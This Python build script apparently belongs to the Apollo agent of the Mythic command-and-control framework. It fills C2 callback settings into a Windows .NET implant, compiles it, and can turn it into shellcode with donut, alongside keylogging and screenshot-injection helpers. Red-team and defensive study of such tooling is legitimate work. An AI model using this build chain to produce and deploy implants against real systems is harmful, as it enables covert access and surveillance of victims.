from mythic_payloadtype_container.PayloadBuilder import *
from mythic_payloadtype_container.MythicCommandBase import *
import os, fnmatch, tempfile, sys, asyncio
from distutils.dir_util import copy_tree
import traceback
import donut
import shutil

class Apollo(PayloadType):
    name = "apollo"
    file_extension = "exe"
    author = "@djhohnstein"
    mythic_encrypts = True
    supported_os = [
        SupportedOS.Windows
    ]
    version = "2.2.1"
    wrapper = False
    wrapped_payloads = ["scarecrow_wrapper", "service_wrapper"]
    note = """
A fully featured .NET 4.0 compatible training agent. Version: {}
    """.format(version)
    supports_dynamic_loading = True
    build_parameters = [
        BuildParameter(
            name = "output_type",
            parameter_type=BuildParameterType.ChooseOne,
            choices=[ "WinExe", "Shellcode"],
            default_value="WinExe",
            description="Output as shellcode, executable, or dynamically loaded library.",
        )
    ]
    c2_profiles = ["http", "smb", "tcp"]
    support_browser_scripts = [
        BrowserScript(script_name="copy_additional_info_to_clipboard", author="@djhohnstein"),
        BrowserScript(script_name="create_table", author="@djhohnstein"),
        BrowserScript(script_name="create_table_with_name", author="@djhohnstein"),
        BrowserScript(script_name="collapsable", author="@djhohnstein"),
        BrowserScript(script_name="create_process_additional_info_modal", author="@djhohnstein"),
        BrowserScript(script_name="create_permission_additional_info_modal", author="@djhohnstein"),
        BrowserScript(script_name="file_size_to_human_readable_string", author="@djhohnstein"),
        BrowserScript(script_name="integrity_level_to_string", author="@djhohnstein"),
        BrowserScript(script_name="show_process_additional_info_modal", author="@djhohnstein"),
        BrowserScript(script_name="show_permission_additional_info_modal", author="@djhohnstein"),
    ]

    async def build(self) -> BuildResponse:
        # this function gets called to create an instance of your payload
        resp = BuildResponse(status=BuildStatus.Error)
        # debugging
        # resp.status = BuildStatus.Success
        # return resp
        #end debugging
        defines_commands_upper = [f"#define {x.upper()}" for x in self.commands.get_commands()]
        special_files_map = {
            "Config.cs": {
                "callback_interval": "",
                "callback_jitter": "",
                "callback_port": "",
                "callback_host": "",
                "post_uri": "",
                "proxy_host": "",
                "proxy_port": "",
                "proxy_user": "",
                "proxy_pass": "",
                # "domain_front": "",
                "killdate": "",
                # "USER_AGENT": "",
                "pipename": "",
                "port": "",
                "encrypted_exchange_check": "",
                "payload_uuid": self.uuid,
                "AESPSK": "",
            },
        }
        extra_variables = {
            
        }
        success_message = f"Apollo {self.uuid} Successfully Built"
        stdout_err = ""
        defines_profiles_upper = []
        for c2 in self.c2info:
            profile = c2.get_c2profile()
            defines_profiles_upper.append(f"#define {profile['name'].upper()}")
            for key, val in c2.get_parameters_dict().items():
                if isinstance(val, dict):
                    stdout_err += "Setting {} to {}".format(key, val["enc_key"])
                    special_files_map["Config.cs"][key] = val["enc_key"] if val["enc_key"] is not None else ""
                elif isinstance(val, list):
                    for item in val:
                        if not isinstance(item, dict):
                            raise Exception("Expected a list of dictionaries, but got {}".format(type(item)))
                        extra_variables[item["key"]] = item["value"]
                        # if item["key"] == "Host":
                        #     special_files_map["Config.cs"]["domain_front"] = item["value"]
                        # elif item["key"] == "User-Agent":
                        #     special_files_map["Config.cs"]["USER_AGENT"] = item["value"]
                        # else:
                        #     special_files_map["Config.cs"][item["key"]] = item["value"]
                elif isinstance(val, str):
                    special_files_map["Config.cs"][key] = val
                else:
                    special_files_map["Config.cs"][key] = json.dumps(val)
        try:
            # make a temp directory for it to live
            agent_build_path = tempfile.TemporaryDirectory(suffix=self.uuid)
            # shutil to copy payload files over
            copy_tree(self.agent_code_path, agent_build_path.name)
            # first replace everything in the c2 profiles
            for csFile in get_csharp_files(agent_build_path.name):
                templateFile = open(csFile, "rb").read().decode()
                templateFile = templateFile.replace("#define C2PROFILE_NAME_UPPER", "\n".join(defines_profiles_upper))
                templateFile = templateFile.replace("#define COMMAND_NAME_UPPER",  "\n".join(defines_commands_upper) )
                for specialFile in special_files_map.keys():
                    if csFile.endswith(specialFile):
                        for key, val in special_files_map[specialFile].items():
                            templateFile = templateFile.replace(key + "_here", val)
                        if specialFile == "Config.cs":
                            if len(extra_variables.keys()) > 0:
                                extra_data = ""
                                for key, val in extra_variables.items():
                                    extra_data += "                        { \"" + key + "\", \"" + val + "\" },\n"
                                templateFile = templateFile.replace("HTTP_ADDITIONAL_HEADERS_HERE", extra_data)
                            else:
                                templateFile = templateFile.replace("HTTP_ADDITIONAL_HEADERS_HERE", "")
                with open(csFile, "wb") as f:
                    f.write(templateFile.encode())
            outputType = self.get_parameter('output_type').lower()
            file_ext = "exe"
            if self.get_parameter('output_type') == "Shellcode":
                outputType = "WinExe"
                file_ext = "exe"
            elif self.get_parameter('output_type') == "DLL":
                outputType = "library"
                file_ext = "dll"
            command = "rm -rf packages/*; nuget restore -NoCache -Force; msbuild -p:Configuration=Release -p:Platform=\"Any CPU\""
            proc = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE,
                                                         stderr=asyncio.subprocess.PIPE, cwd=agent_build_path.name)
            stdout, stderr = await proc.communicate()
            if stdout:
                stdout_err += f'[stdout]\n{stdout.decode()}\n'
            if stderr:
                stdout_err += f'[stderr]\n{stderr.decode()}' + "\n" + command
            output_path = "{}/Apollo/bin/Release/Apollo.exe".format(agent_build_path.name)
            
            if os.path.exists(output_path):
                resp.status = BuildStatus.Success
                targetExeAsmPath = "/srv/ExecuteAssembly.exe"
                targetPowerPickPath = "/srv/PowerShellHost.exe"
                targetScreenshotInjectPath = "/srv/ScreenshotInject.exe"
                targetKeylogInjectPath = "/srv/KeylogInject.exe"
                targetExecutePEPath = "/srv/ExecutePE.exe"
                targetInteropPath = "/srv/ApolloInterop.dll"
                shutil.move("{}/ExecuteAssembly/bin/Release/ExecuteAssembly.exe".format(agent_build_path.name), targetExeAsmPath)
                shutil.move("{}/PowerShellHost/bin/Release/PowerShellHost.exe".format(agent_build_path.name), targetPowerPickPath)
                shutil.move("{}/ScreenshotInject/bin/Release/ScreenshotInject.exe".format(agent_build_path.name), targetScreenshotInjectPath)
                shutil.move("{}/KeylogInject/bin/Release/KeylogInject.exe".format(agent_build_path.name), targetKeylogInjectPath)
                shutil.move("{}/ExecutePE/bin/Release/ExecutePE.exe".format(agent_build_path.name), targetExecutePEPath)
                shutil.move("{}/ApolloInterop/bin/Release/ApolloInterop.dll".format(agent_build_path.name), targetInteropPath)
                if self.get_parameter('output_type') != "Shellcode":
                    resp.payload = open(output_path, 'rb').read()
                    resp.message = success_message
                    resp.status = BuildStatus.Success
                    resp.build_stdout = stdout_err
                else:
                    shellcode_path = "{}/loader.bin".format(agent_build_path.name)
                    donutPath = "/Mythic/agent_code/donut"
                    command = "chmod 777 {}; chmod +x {}".format(donutPath, donutPath)
                    proc = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr= asyncio.subprocess.PIPE)
                    stdout, stderr = await proc.communicate()
                    
                    command = "{} -f 1 {}".format(donutPath, output_path)
                    # need to go through one more step to turn our exe into shellcode
                    proc = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE,
                                                    stderr=asyncio.subprocess.PIPE, cwd=agent_build_path.name)
                    stdout, stderr = await proc.communicate()
                    
                    stdout_err += f'[stdout]\n{stdout.decode()}\n'
                    stdout_err += f'[stderr]\n{stderr.decode()}'

                    if (not os.path.exists(shellcode_path)):
                        resp.message = "Failed to create shellcode"
                        resp.status = BuildStatus.Error
                        resp.payload = b""
                        resp.build_stderr = stdout_err
                    else:
                        resp.payload = open(shellcode_path, 'rb').read()
                        resp.message = success_message
                        resp.status = BuildStatus.Success
                        resp.build_stdout = stdout_err
            else:
                # something went wrong, return our errors
                resp.status = BuildStatus.Error
                resp.payload = b""
                resp.build_message = "Unknown error while building payload. Check the stderr for this build."
                resp.build_stderr = stdout_err
        except Exception as e:
            resp.payload = b""
            resp.status = BuildStatus.Error
            resp.build_message = "Error building payload: " + str(traceback.format_exc())
        return resp


def get_csharp_files(base_path: str) -> [str]:
    results = []
    for root, dirs, files in os.walk(base_path):
        for name in files:
            if fnmatch.fnmatch(name, "*.cs"):
                results.append(os.path.join(root, name))
    if len(results) == 0:
        raise Exception("No payload files found with extension .cs")
    return results
